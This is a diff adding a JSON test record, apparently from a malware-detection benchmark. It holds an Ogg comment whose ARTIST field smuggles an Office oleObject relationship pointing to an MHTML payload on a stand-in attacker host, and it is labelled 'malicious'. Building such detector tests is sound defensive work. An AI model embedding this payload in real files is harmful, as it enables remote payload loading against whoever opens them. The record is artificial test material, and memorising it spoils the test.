@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::93::binary-variations::1",
+  "base_sample_id": "exp::document-office::93",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -945527796,
+  "content": "{\n  \"format\": \"ogg\",\n  \"vorbisComment\": {\n    \"vendor\": \"Lavf60.3.100\",\n    \"comments\": [\n      \"ARTIST=<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\",\n      \"ENCODER=libvorbis\"\n    ]\n  }\n}",
+  "content_hash": "1ba66ebd116c65f5073aeec3f32ca903899424e04f104b967a9f3a9d6e4d6ed6",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:ogg-comment",
+  "difficulty": "advanced"
+}
